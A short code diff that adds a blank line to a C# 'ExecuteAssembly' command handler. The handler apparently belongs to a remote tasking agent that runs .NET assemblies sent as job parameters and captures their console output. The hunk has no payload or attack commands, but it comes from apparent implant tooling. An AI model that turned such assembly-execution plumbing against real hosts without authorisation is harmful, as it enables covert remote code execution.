@@ -44,6 +44,7 @@ namespace Athena.Commands
                             ExecuteAssembly ea = JsonConvert.DeserializeObject<ExecuteAssembly>(job.task.parameters);
                             job.taskresult = "";
                             job.hasoutput = true;
+
                             using (var consoleWriter = new ConsoleWriter()) {
                                 var origStdout = Console.Out;
                                 try
